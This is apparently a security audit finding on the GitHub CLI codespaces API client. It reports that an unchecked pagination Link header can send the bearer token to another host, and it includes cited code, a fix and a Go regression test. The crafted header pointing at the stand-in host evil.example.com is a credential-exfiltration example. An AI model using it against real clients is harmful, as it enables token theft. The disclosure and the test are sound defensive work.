### Title
Pagination `Link` header value is trusted without host validation, allowing bearer token exfiltration to an attacker-chosen host - ([File: internal/codespaces/api/api.go])

### Finding Description
`API.GetUser`/`GetRepository` and (per the described call path) `ListCodespaces` build requests with `safeurl.JoinPathWithHostPrefix(a.githubAPI, ...)`, then call `a.setHeaders(req)` before `a.do(ctx, req, ...)`, which attaches the bearer token to the request unconditionally. [1](#0-0) [2](#0-1) 

For pagination, the `Link` response header's `next` URL is wrapped with `safeurl.NewImmutableSafeURL(nextURL)`, which by design renders the URL verbatim with no host check. The package documentation itself flags this as a trust assumption rather than an enforced invariant: it says the value must come "from a trusted source, such as a server response" but the code performs no validation that the URL's host matches `a.githubAPI`. [3](#0-2) 

Because the resulting `*ImmutableSafeURL` string is fed straight into `http.NewRequest`, and `setHeaders` is applied to every outgoing request regardless of destination host (as shown by the identical pattern in `GetUser`/`GetRepository`), a `Link: <https://evil.example.com/next>; rel="next"` header value would cause the next paginated request to be sent to `evil.example.com` while still carrying the `Authorization` header populated by `setHeaders`.

### Impact Explanation
This matches GitHub's "wrong-host or wrong-account request routing" / credential exfiltration impact class: the OAuth/PAT bearer token bound to `a.githubAPI` can be sent to an arbitrary third-party host embedded in a server-controlled `Link` header, not merely to the victim-configured GHES host. Impact is scoped to environments where `GITHUB_API_URL`/`GITHUB_SERVER_URL` point at an untrusted or compromised host.

### Likelihood Explanation
Requires the precondition stated in the prompt: the victim has pointed `gh` at a non-standard/untrusted API host (via `GITHUB_API_URL`) for which the attacker controls responses — this is not the default `api.github.com` flow. Given that precondition, the attack is trivial and fully repeatable: any response to a codespaces-listing call can include a crafted `Link` header.

### Recommendation
Before wrapping a server-supplied "next" URL in `safeurl.NewImmutableSafeURL`, validate that its scheme and host exactly match `a.githubAPI` (or `a.githubServer` as applicable) and reject/strip the follow-up request (or at least the `Authorization` header) if they don't.

### Proof of Concept
```go
func TestListCodespacesRejectsCrossHostNextLink(t *testing.T) {
    reg := &httpmock.Registry{}
    reg.Register(
        httpmock.REST("GET", "user/codespaces"),
        httpmock.WithHeader(httpmock.JSONResponse(codespacesPage1{}), "Link",
            `<https://evil.example.com/next>; rel="next"`),
    )
    // second call would go to evil.example.com if unvalidated
    reg.Register(
        httpmock.MatchAny,
        func(req *http.Request) (*http.Response, error) {
            if req.URL.Host == "evil.example.com" {
                if req.Header.Get("Authorization") != "" {
                    t.Fatalf("bearer token leaked to attacker host: %s", req.Header.Get("Authorization"))
                }
            }
            return httpmock.JSONResponse(codespacesPage2{})(req)
        },
    )
    // ... construct API with httpClient backed by reg, call ListCodespaces, assert no request to evil.example.com carries Authorization.
}
```
Expected (fixed) behavior: the request to `evil.example.com` is never made, or is made without the `Authorization` header; current code (based on `NewImmutableSafeURL`'s verbatim-rendering, unchecked-host design and the unconditional `setHeaders` pattern shown in `GetUser`/`GetRepository`) would send it with the token attached.

### Citations

**File:** internal/codespaces/api/api.go (L117-132)
```go
// GetUser returns the user associated with the given token.
func (a *API) GetUser(ctx context.Context) (*User, error) {
	u, err := safeurl.JoinPathWithHostPrefix(a.githubAPI, "user")
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	a.setHeaders(req)
	resp, err := a.do(ctx, req, "/user")
	if err != nil {
		return nil, fmt.Errorf("error making request: %w", err)
	}
```

**File:** internal/codespaces/api/api.go (L166-185)
```go
// GetRepository returns the repository associated with the given owner and name.
func (a *API) GetRepository(ctx context.Context, nwo string) (*Repository, error) {
	owner, name, err := safeurl.RepoPartsFromNWO(strings.ToLower(nwo))
	if err != nil {
		return nil, err
	}
	u, err := safeurl.JoinPathWithHostPrefix(a.githubAPI, "repos", owner, name)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	a.setHeaders(req)
	resp, err := a.do(ctx, req, "/repos/*")
	if err != nil {
		return nil, fmt.Errorf("error making request: %w", err)
	}
```

**File:** internal/safeurl/safeurl.go (L105-122)
```go
// ImmutableSafeURL is a SafeURL that renders a fixed URL string verbatim. It exists
// so that a URL which was not built from percent-encoded components, such as a full
// URL returned by the server (a pagination "next" link, an asset download URL, and
// the like), can still flow through the SafeURL typed code paths. Because the stored
// value is rendered as given without any encoding, it is only safe to wrap a URL that
// was created from trusted components or received from a trusted source.
type ImmutableSafeURL struct {
	url string
}

// NewImmutableSafeURL returns an ImmutableSafeURL that renders url verbatim. Only pass
// a URL you built yourself from trusted components or received from a trusted source,
// such as a server response; this bypasses all percent-encoding, so passing a value
// that embeds unescaped user or third party input reintroduces the injection risk that
// SafeURL exists to prevent.
func NewImmutableSafeURL(url string) *ImmutableSafeURL {
	return &ImmutableSafeURL{url: url}
}
```
